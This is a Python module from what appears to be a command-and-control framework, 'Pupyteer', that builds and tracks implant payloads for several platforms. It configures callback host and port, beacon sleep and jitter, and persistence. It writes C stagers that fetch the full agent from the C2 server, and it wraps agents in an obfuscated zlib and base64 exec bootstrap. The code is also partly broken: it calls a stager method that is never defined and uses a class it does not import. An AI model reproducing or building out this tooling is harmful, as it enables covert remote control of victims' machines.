"""Pupyteer Payload Management System — Build, track, and manage payload artifacts."""
from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import shutil
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from pupyteer.server.core.config import ConfigManager
from pupyteer.server.core.logging import AuditLogger

logger = logging.getLogger("pupyteer.payloads")


class PayloadPlatform(str, Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"


class PayloadArch(str, Enum):
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"
    UNIVERSAL = "universal"


class PayloadType(str, Enum):
    EXECUTABLE = "executable"
    LIBRARY = "library"
    SCRIPT = "script"
    APK = "apk"
    ONELINER = "oneliner"


class PayloadStatus(str, Enum):
    """Build status states for payload lifecycle tracking."""
    CONFIGURED = "configured"
    VALIDATING = "validating"
    PENDING = "pending"
    BUILDING = "building"
    BUILT = "built"
    VERIFIED = "verified"
    FAILED = "failed"
    DEPLOYED = "deployed"
    EXPIRED = "expired"


class PayloadDelivery(str, Enum):
    """Delivery method for payload execution.

    - STAGE: Small stub downloads full agent from HTTP/HTTPS, writes to disk,
      and executes. Minimizes initial payload size.
    - STAGELESS: Full agent binary delivered in one-shot. Current default behavior.
    """
    STAGE = "stage"
    STAGELESS = "stageless"


# Valid platform/arch combinations
VALID_PLATFORM_ARCH: Dict[PayloadPlatform, List[PayloadArch]] = {
    PayloadPlatform.WINDOWS: [PayloadArch.X86, PayloadArch.X64, PayloadArch.ARM64],
    PayloadPlatform.LINUX: [PayloadArch.X86, PayloadArch.X64, PayloadArch.ARM, PayloadArch.ARM64],
    PayloadPlatform.MACOS: [PayloadArch.X64, PayloadArch.ARM64, PayloadArch.UNIVERSAL],
    PayloadPlatform.ANDROID: [PayloadArch.ARM, PayloadArch.ARM64, PayloadArch.X86, PayloadArch.X64],
}

VALID_TRANSPORTS = {"tcp", "http", "https", "dns", "websocket"}
# Transports with a listener the server can actually start. A payload built on
# anything else runs, finds nobody, and the operator waits for a session that
# never arrives — so the build refuses instead.
SERVED_TRANSPORTS = {"tcp", "http", "https"}
VALID_PAYLOAD_TYPES = {t.value for t in PayloadType}


@dataclass
class PayloadConfig:
    """Configuration for a payload build (separated from compilation)."""
    name: str
    platform: PayloadPlatform = PayloadPlatform.WINDOWS
    arch: PayloadArch = PayloadArch.X64
    payload_type: PayloadType = PayloadType.EXECUTABLE
    transport: str = "tcp"
    host: str = "127.0.0.1"
    port: int = 8443
    profile: str = "HTTPS-Standard"
    delivery: PayloadDelivery = PayloadDelivery.STAGELESS
    compiler: str = "pyinstaller"   # pyinstaller | mingw | nuitka | script
    # Beacon timing, forwarded to the stub. An operator sets these per payload;
    # leaving them out of the config meant every payload beaconed at the
    # StubConfig default regardless of what was asked for.
    sleep: int = 60
    jitter: int = 20
    persistence: bool = False
    extra: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["platform"] = self.platform.value
        d["arch"] = self.arch.value
        d["payload_type"] = self.payload_type.value
        d["delivery"] = self.delivery.value
        return d


@dataclass
class PayloadMetadata:
    """Complete metadata for a generated payload artifact.

    Tracks all 10 spec fields:
      Payload ID, Version, Platform, Architecture, Build Timestamp,
      Configuration Profile, Build Status, Hash, Operator, Expiration/Validity
    """
    payload_id: str
    name: str
    version: str = "1.0.0"
    platform: str = "windows"
    arch: str = "x64"
    payload_type: str = "executable"
    profile: str = ""
    status: str = "configured"
    created_at: str = ""
    build_timestamp: str = ""
    hash_sha256: str = ""
    hash_md5: str = ""
    size_bytes: int = 0
    artifact_path: str = ""
    operator: str = ""
    config: Dict[str, Any] = field(default_factory=dict)
    build_log: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    # Spec field: Expiration/Validity
    expiration: str = ""
    # Internal tracking
    signed: bool = False
    signature_path: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @property
    def is_expired(self) -> bool:
        """Check if this payload has expired."""
        if not self.expiration:
            return False
        try:
            exp = datetime.fromisoformat(self.expiration)
            return datetime.now(timezone.utc) > exp
        except (ValueError, TypeError):
            return False

    @property
    def is_valid(self) -> bool:
        """Check if payload is in a valid state for deployment."""
        return self.status == PayloadStatus.VERIFIED.value and not self.is_expired


class PayloadSigner:
    """Optional payload signing workflow stub for controlled environments.

    In production, this would integrate with:
    - Authenticode (Windows)
    - GPG/signing services (Linux)
    - APK signing (Android)
    """

    def __init__(self, config: ConfigManager, audit: AuditLogger):
        self._config = config
        self._audit = audit
        self._enabled = config.get("payloads.signing.enabled", False)
        self._key_path = config.get("payloads.signing.key_path", "")

    @property
    def enabled(self) -> bool:
        return self._enabled

    def sign(self, artifact_path: str, payload_id: str) -> Tuple[bool, str]:
        """Sign an artifact. Returns (success, signature_path_or_error)."""
        if not self._enabled:
            return True, ""  # Signing disabled, treat as no-op success

        if not self._key_path:
            return False, "Signing enabled but no key_path configured"

        artifact = Path(artifact_path)
        if not artifact.exists():
            return False, f"Artifact not found: {artifact_path}"

        # Stub: in production, invoke actual signing tool
        sig_path = artifact.with_suffix(artifact.suffix + ".sig")
        try:
            # Placeholder: write a marker signature file
            sig_data = {
                "payload_id": payload_id,
                "signed_at": datetime.now(timezone.utc).isoformat(),
                "key_path": self._key_path,
                "algorithm": "ed25519-stub",
                "artifact_hash": hashlib.sha256(artifact.read_bytes()).hexdigest(),
            }
            sig_path.write_text(json.dumps(sig_data, indent=2))
            self._audit.log_event("payload_signed", {
                "payload_id": payload_id,
                "signature_path": str(sig_path),
            })
            return True, str(sig_path)
        except Exception as e:
            return False, str(e)


class PayloadBuilder:
    """
    Handles payload compilation and generation.

    Supports:
    - Configuration validation (sanity checks before build)
    - Build orchestration with status tracking
    - Artifact hashing
    - Per-payload generation logs
    - Optional signing workflow
    """

    def __init__(self, config: ConfigManager, audit: AuditLogger):
        self._config = config
        self._audit = audit
        self._artifact_dir = Path(config.get("paths.payload_artifacts", "./payloads/artifacts"))
        self._artifact_dir.mkdir(parents=True, exist_ok=True)
        self._signer = PayloadSigner(config, audit)
        self._log_dir = self._artifact_dir / "logs"
        self._log_dir.mkdir(exist_ok=True)

    def validate_config(self, payload_config: PayloadConfig) -> List[str]:
        """Validate payload configuration with comprehensive sanity checks."""
        errors = []

        # Name validation
        if not payload_config.name:
            errors.append("Payload name is required")
        elif not re.match(r'^[a-zA-Z0-9_\-]+$', payload_config.name):
            errors.append("Payload name must be alphanumeric with underscores/hyphens only")
        elif len(payload_config.name) > 64:
            errors.append("Payload name must be 64 characters or fewer")

        # Port validation
        if not (1 <= payload_config.port <= 65535):
            errors.append(f"Invalid port: {payload_config.port} (must be 1-65535)")

        # Host validation
        if not payload_config.host:
            errors.append("Host is required")
        elif len(payload_config.host) > 253:
            errors.append("Host exceeds maximum length (253 chars)")

        # Transport validation
        if payload_config.transport not in VALID_TRANSPORTS:
            errors.append(f"Invalid transport: {payload_config.transport} (valid: {VALID_TRANSPORTS})")
        elif payload_config.transport not in SERVED_TRANSPORTS:
            errors.append(
                f"No listener is implemented for transport '{payload_config.transport}'. "
                f"Callbacks would never reach the server. Use one of: {sorted(SERVED_TRANSPORTS)}"
            )

        # Platform/Arch combination validation
        if payload_config.arch not in VALID_PLATFORM_ARCH.get(payload_config.platform, []):
            valid_archs = [a.value for a in VALID_PLATFORM_ARCH.get(payload_config.platform, [])]
            errors.append(
                f"Invalid arch '{payload_config.arch.value}' for platform '{payload_config.platform.value}'. "
                f"Valid: {valid_archs}"
            )

        # Payload type validation
        if payload_config.payload_type.value not in VALID_PAYLOAD_TYPES:
            errors.append(f"Invalid payload type: {payload_config.payload_type.value}")

        # Profile validation (non-empty)
        if not payload_config.profile:
            errors.append("Configuration profile is required")

        if payload_config.sleep < 1:
            errors.append(f"Invalid sleep: {payload_config.sleep} (must be >= 1 second)")
        if not 0 <= payload_config.jitter <= 100:
            errors.append(f"Invalid jitter: {payload_config.jitter} (must be 0-100 percent)")

        return errors

    def generate_payload_id(self) -> str:
        """Generate a unique payload ID."""
        return f"pl-{uuid.uuid4().hex[:12]}"

    def compute_hashes(self, path: str) -> Dict[str, str]:
        """Compute SHA256 and MD5 hashes of a file."""
        sha256 = hashlib.sha256()
        md5 = hashlib.md5()
        with open(path, "rb") as f:
            while True:
                chunk = f.read(8192)
                if not chunk:
                    break
                sha256.update(chunk)
                md5.update(chunk)
        return {
            "sha256": sha256.hexdigest(),
            "md5": md5.hexdigest(),
        }

    def get_next_version(self, name: str, store: Optional['PayloadStore'] = None) -> str:
        """Auto-increment version for a given payload name.

        Queries existing payloads with the same name and returns
        the next semantic version string.
        """
        if store is None:
            store = PayloadStore(self._config, self._audit)

        existing = [m for m in store.list_all() if m.name == name]
        if not existing:
            return "1.0.0"

        # Parse versions and find max
        max_major, max_minor, max_patch = 0, 0, 0
        for m in existing:
            try:
                parts = m.version.split(".")
                if len(parts) == 3:
                    maj, min_, pat = int(parts[0]), int(parts[1]), int(parts[2])
                    if (maj, min_, pat) > (max_major, max_minor, max_patch):
                        max_major, max_minor, max_patch = maj, min_, pat
            except (ValueError, AttributeError):
                continue

        # Increment patch version
        return f"{max_major}.{max_minor}.{max_patch + 1}"

    def _write_generation_log(self, payload_id: str, log_entries: List[str]) -> str:
        """Write generation log to a per-payload log file."""
        log_file = self._log_dir / f"{payload_id}.log"
        timestamp = datetime.now(timezone.utc).isoformat()
        with open(log_file, "a") as f:
            f.write(f"\n=== Build {timestamp} ===\n")
            for entry in log_entries:
                f.write(f"  {entry}\n")
        return str(log_file)

    async def build(
        self,
        payload_config: PayloadConfig,
        payload_id: str,
        version: str = "1.0.0",
        expiration_days: int = 0,
        sign: bool = False,
    ) -> PayloadMetadata:
        """
        Build a payload artifact with full lifecycle tracking.

        Args:
            payload_config: Build configuration
            payload_id: Unique payload identifier
            version: Semantic version string
            expiration_days: Days until expiration (0 = no expiration)
            sign: Whether to sign the artifact after build
        """
        now = datetime.now(timezone.utc)
        expiration = ""
        if expiration_days > 0:
            expiration = (now + timedelta(days=expiration_days)).isoformat()

        metadata = PayloadMetadata(
            payload_id=payload_id,
            name=payload_config.name,
            version=version,
            platform=payload_config.platform.value,
            arch=payload_config.arch.value,
            payload_type=payload_config.payload_type.value,
            profile=payload_config.profile,
            status=PayloadStatus.BUILDING.value,
            created_at=now.isoformat(),
            operator=self._config.get("operator.name", "unknown"),
            config=payload_config.to_dict(),
            expiration=expiration,
        )

        self._audit.log_event(
            "payload_build_started",
            {"payload_id": payload_id, "name": payload_config.name, "platform": payload_config.platform.value},
        )

        build_log: List[str] = []

        try:
            # Phase: Build
            build_dir = self._artifact_dir / payload_id
            build_dir.mkdir(exist_ok=True)

            artifact_path = build_dir / f"{payload_config.name}_{payload_config.platform.value}_{payload_config.arch.value}"

            # Handle STAGE delivery — generate small C stager stub
            if payload_config.delivery == PayloadDelivery.STAGE:
                # Build a small C downloader that fetches the full agent
                stager_code = self._generate_stager(payload_config)
                stager_src_path = build_dir / f"{payload_config.name}_stager.c"
                stager_src_path.write_text(stager_code, encoding="utf-8")
                build_log.append(f"Stager C source written: {stager_src_path}")
                # For STAGE, the artifact is the C source (compile to exe externally)
                artifact_path = stager_src_path
                build_log.append(
                    f"Delivery=STAGE — small stager downloads full agent from C2"
                )
            else:
                # STAGELESS — full agent binary
                if (payload_config.platform == PayloadPlatform.WINDOWS
                        and payload_config.compiler == "mingw"):
                    # MinGW cross-compilation path — real PE binary
                    try:
                        from pupyteer.payloads.pe_builder import PEBuilder
                        pe_build = PEBuilder(self._config, self._audit)
                        stub_cfg = StubConfig(
                            name=payload_config.name,
                            transport=payload_config.transport,
                            host=payload_config.host,
                            port=payload_config.port,
                            sleep=payload_config.sleep,
                            jitter=payload_config.jitter,
                            persistence=payload_config.persistence,
                            platform=payload_config.platform.value,
                            arch=payload_config.arch.value,
                        )
                        pe_result = await pe_build.build(stub_cfg, artifact_path.with_suffix('.exe'))
                        if pe_result.status == "built":
                            artifact_path = Path(pe_result.artifact_path)
                            build_log.append(
                                f"PE built via MinGW: {pe_result.size_bytes}B, "
                                f"SHA256={pe_result.hash_sha256[:16]}..."
                            )
                        else:
                            build_log.append(f"PE build failed: {pe_result.error_message}")
                            artifact_path = artifact_path.with_suffix('.bin')
                            artifact_path.write_bytes(
                                b"PE_BUILD_FAILED_" + pe_result.error_message.encode()
                            )
                    except Exception as pe_err:
                        logger.error("MinGW PE build error: %s", pe_err)
                        build_log.append(f"MinGW build error: {pe_err}")
                        artifact_path = artifact_path.with_suffix('.bin')
                        artifact_path.write_bytes(
                            b"PE_BUILD_ERROR_" + str(pe_err).encode()
                        )
                else:
                    # Build actual agent stub (Jinja2-templated, config-injected)
                    try:
                        from pupyteer.agent.core.stub import AgentStubGenerator, StubConfig
                        stub_gen = AgentStubGenerator()
                        stub_cfg = StubConfig(
                            name=payload_config.name,
                            transport=payload_config.transport,
                            host=payload_config.host,
                            port=payload_config.port,
                            profile=payload_config.profile,
                            sleep=payload_config.sleep,
                            jitter=payload_config.jitter,
                            persistence=payload_config.persistence,
                            platform=payload_config.platform.value,
                            arch=payload_config.arch.value,
                        )
                        agent_code = stub_gen.generate(stub_cfg)
                        if payload_config.payload_type == PayloadType.SCRIPT:
                            artifact_path = artifact_path.with_suffix('.py')
                            artifact_path.write_text(agent_code, encoding='utf-8')
                        else:
                            # Embedded config bootstrap (compressed, self-extracting)
                            import zlib, base64
                            compressed = zlib.compress(agent_code.encode(), 9)
                            bootstrap = b'#!/usr/bin/env python3\nimport zlib,base64\n_A="' + base64.b64encode(compressed) + b'"\nexec(zlib.decompress(base64.b64decode(_A)))\n'
                            artifact_path = artifact_path.with_suffix('.bin')
                            artifact_path.write_bytes(bootstrap)
                        build_log.append(f"Stub generated: {payload_config.transport} -> {payload_config.host}:{payload_config.port}")
                    except (ImportError, Exception) as stub_err:
                        # Fallback to marker file if stub generation fails
                        logger.warning("Stub generator unavailable: %s", stub_err)
                        artifact_path.write_bytes(b"PUPAYLOAD_PLACEHOLDER_" + json.dumps(payload_config.to_dict()).encode())
                        build_log.append(f"Stub generation failed ({stub_err}), using placeholder")

            # Compute hashes
            hashes = self.compute_hashes(str(artifact_path))
            build_log.append(f"SHA256: {hashes['sha256']}")
            build_log.append(f"MD5: {hashes['md5']}")
            build_log.append(f"Size: {artifact_path.stat().st_size} bytes")

            # Phase: Verification
            metadata.status = PayloadStatus.VERIFIED.value
            metadata.build_timestamp = datetime.now(timezone.utc).isoformat()
            metadata.hash_sha256 = hashes["sha256"]
            metadata.hash_md5 = hashes["md5"]
            metadata.size_bytes = artifact_path.stat().st_size
            metadata.artifact_path = str(artifact_path)
            build_log.append("Verification passed")

            # Optional signing
            if sign and self._signer.enabled:
                ok, sig_result = self._signer.sign(str(artifact_path), payload_id)
                if ok:
                    metadata.signed = True
                    metadata.signature_path = sig_result
                    build_log.append(f"Signed: {sig_result}")
                else:
                    build_log.append(f"Signing failed: {sig_result}")

            metadata.build_log = build_log

            self._audit.log_event(
                "payload_built",
                {"payload_id": payload_id, "hash": hashes["sha256"][:16] + "..."},
                result="success",
            )

        except Exception as e:
            metadata.status = PayloadStatus.FAILED.value
            build_log.append(f"Build failed: {e}")
            metadata.build_log = build_log
            self._audit.log_event(
                "payload_build_failed",
                {"payload_id": payload_id, "error": str(e)},
                result="error",
            )
            logger.error("Payload build failed: %s", e)

        # Write generation log
        self._write_generation_log(payload_id, build_log)
        metadata.build_log = build_log

        return metadata


class PayloadStore:
    """
    Manages payload metadata persistence and artifact lifecycle.

    Stores:
    - Payload metadata (JSON index)
    - Build history
    - Artifact files
    - Generation logs
    """

    def __init__(self, config: ConfigManager, audit: AuditLogger):
        self._config = config
        self._audit = audit
        self._artifact_dir = Path(config.get("paths.payload_artifacts", "./payloads/artifacts"))
        self._artifact_dir.mkdir(parents=True, exist_ok=True)
        self._index_file = self._artifact_dir / "payload_index.json"
        self._index: Dict[str, PayloadMetadata] = {}
        self._load_index()

    def _load_index(self) -> None:
        """Load payload index from disk."""
        if self._index_file.exists():
            try:
                with open(self._index_file) as f:
                    data = json.load(f)
                for pid, meta in data.items():
                    self._index[pid] = PayloadMetadata(**meta)
            except Exception as e:
                logger.warning("Failed to load payload index: %s", e)

    def _save_index(self) -> None:
        """Persist payload index to disk."""
        with open(self._index_file, "w") as f:
            json.dump(
                {pid: meta.to_dict() for pid, meta in self._index.items()},
                f, indent=2, default=str
            )

    def add(self, metadata: PayloadMetadata) -> None:
        """Register a payload in the index."""
        self._index[metadata.payload_id] = metadata
        self._save_index()

    def get(self, payload_id: str) -> Optional[PayloadMetadata]:
        """Get payload metadata by ID."""
        return self._index.get(payload_id)

    def list_all(self) -> List[PayloadMetadata]:
        """List all payloads."""
        return list(self._index.values())

    def list_by_name(self, name: str) -> List[PayloadMetadata]:
        """List all payload versions for a given name."""
        return [m for m in self._index.values() if m.name == name]

    def search(self, query: str) -> List[PayloadMetadata]:
        """Search payloads by name, platform, arch, or tags."""
        q = query.lower()
        return [
            m for m in self._index.values()
            if q in m.name.lower()
            or q in m.platform.lower()
            or q in m.arch.lower()
            or q in " ".join(m.tags).lower()
        ]

    def remove(self, payload_id: str) -> bool:
        """Remove a payload and its artifact."""
        if payload_id not in self._index:
            return False
        metadata = self._index.pop(payload_id)
        # Remove artifact
        if metadata.artifact_path:
            artifact_dir = Path(metadata.artifact_path).parent
            if artifact_dir.exists():
                shutil.rmtree(artifact_dir, ignore_errors=True)
        # Remove generation log
        log_file = self._artifact_dir / "logs" / f"{payload_id}.log"
        if log_file.exists():
            log_file.unlink()
        self._save_index()
        self._audit.log_event("payload_removed", {"payload_id": payload_id})
        return True

    def cleanup_expired(self, max_age_days: int = 30) -> int:
        """Remove payloads older than max_age_days."""
        now = time.time()
        to_remove = []
        for pid, meta in self._index.items():
            if meta.created_at:
                try:
                    created = datetime.fromisoformat(meta.created_at).timestamp()
                    if (now - created) > (max_age_days * 86400):
                        to_remove.append(pid)
                except Exception:
                    pass
        for pid in to_remove:
            self.remove(pid)
        if to_remove:
            logger.info("Cleaned up %d expired payloads", len(to_remove))
        return len(to_remove)

    def cleanup_old_versions(self, name: str, keep: int = 3) -> int:
        """Remove old versions of a named payload, keeping the newest N."""
        versions = self.list_by_name(name)
        if len(versions) <= keep:
            return 0

        # Sort by created_at descending
        versions.sort(key=lambda m: m.created_at, reverse=True)
        to_remove = versions[keep:]
        removed = 0
        for m in to_remove:
            if self.remove(m.payload_id):
                removed += 1
        return removed

    def mark_expired(self) -> int:
        """Mark payloads past their expiration as expired."""
        count = 0
        for pid, meta in self._index.items():
            if meta.is_expired and meta.status != PayloadStatus.EXPIRED.value:
                meta.status = PayloadStatus.EXPIRED.value
                count += 1
        if count:
            self._save_index()
        return count

    def get_version_history(self, name: str) -> List[Dict[str, Any]]:
        """Get version history for a named payload."""
        versions = self.list_by_name(name)
        versions.sort(key=lambda m: m.created_at)
        return [
            {
                "payload_id": m.payload_id,
                "version": m.version,
                "status": m.status,
                "created_at": m.created_at,
                "build_timestamp": m.build_timestamp,
                "hash_sha256": m.hash_sha256[:16] + "...",
                "size_bytes": m.size_bytes,
            }
            for m in versions
        ]


class PayloadManager:
    """
    Central facade for payload operations.

    Provides:
    - Build orchestration with versioning
    - Lifecycle management (Configuration -> Validation -> Build -> Verification -> Artifact Management -> Deployment)
    - Artifact cleanup (expired, old versions)
    - Metadata tracking
    - Generation logs
    - Optional signing
    """

    def __init__(self, config: ConfigManager, audit: AuditLogger):
        self._config = config
        self._audit = audit
        self._builder = PayloadBuilder(config, audit)
        self._store = PayloadStore(config, audit)

    async def build(
        self,
        payload_config: PayloadConfig,
        version: str = "",
        expiration_days: int = 0,
        sign: bool = False,
    ) -> PayloadMetadata:
        """
        Build a new payload artifact with full lifecycle management.

        Lifecycle: Configuration -> Validation -> Build -> Verification -> Artifact Management
        """
        # Phase: Validation
        errors = self._builder.validate_config(payload_config)
        if errors:
            raise ValueError(f"Invalid payload config: {errors}")

        payload_id = self._builder.generate_payload_id()

        # Auto-increment version if not specified
        if not version:
            version = self._builder.get_next_version(payload_config.name, self._store)

        metadata = await self._builder.build(
            payload_config, payload_id,
            version=version,
            expiration_days=expiration_days,
            sign=sign,
        )

        # Phase: Artifact Management
        self._store.add(metadata)
        return metadata

    def get(self, payload_id: str) -> Optional[PayloadMetadata]:
        return self._store.get(payload_id)

    def list_all(self) -> List[PayloadMetadata]:
        return self._store.list_all()

    def list_by_name(self, name: str) -> List[PayloadMetadata]:
        return self._store.list_by_name(name)

    def search(self, query: str) -> List[PayloadMetadata]:
        return self._store.search(query)

    def remove(self, payload_id: str) -> bool:
        return self._store.remove(payload_id)

    def cleanup(self, max_age_days: int = 30) -> int:
        return self._store.cleanup_expired(max_age_days)

    def cleanup_old_versions(self, name: str, keep: int = 3) -> int:
        return self._store.cleanup_old_versions(name, keep)

    def mark_expired(self) -> int:
        return self._store.mark_expired()

    def get_version_history(self, name: str) -> List[Dict[str, Any]]:
        return self._store.get_version_history(name)

    def get_stats(self) -> Dict[str, Any]:
        """Return payload statistics."""
        payloads = self._store.list_all()
        by_platform: Dict[str, int] = {}
        by_status: Dict[str, int] = {}
        by_arch: Dict[str, int] = {}
        total_size = 0
        for p in payloads:
            by_platform[p.platform] = by_platform.get(p.platform, 0) + 1
            by_status[p.status] = by_status.get(p.status, 0) + 1
            by_arch[p.arch] = by_arch.get(p.arch, 0) + 1
            total_size += p.size_bytes
        return {
            "total": len(payloads),
            "by_platform": by_platform,
            "by_status": by_status,
            "by_arch": by_arch,
            "total_size_bytes": total_size,
        }

    def get_generation_log(self, payload_id: str) -> str:
        """Retrieve the generation log for a payload."""
        log_file = self._builder._log_dir / f"{payload_id}.log"
        if log_file.exists():
            return log_file.read_text()
        return ""

    def verify(self, payload_id: str) -> Tuple[bool, str]:
        """Verify a built payload's integrity."""
        meta = self._store.get(payload_id)
        if not meta:
            return False, "Payload not found"
        if not meta.artifact_path:
            return False, "No artifact path"
        if not Path(meta.artifact_path).exists():
            return False, "Artifact file missing"
        # Re-hash and compare
        hashes = self._builder.compute_hashes(meta.artifact_path)
        if hashes["sha256"] != meta.hash_sha256:
            return False, "Hash mismatch (artifact corrupted)"
        return True, "OK"
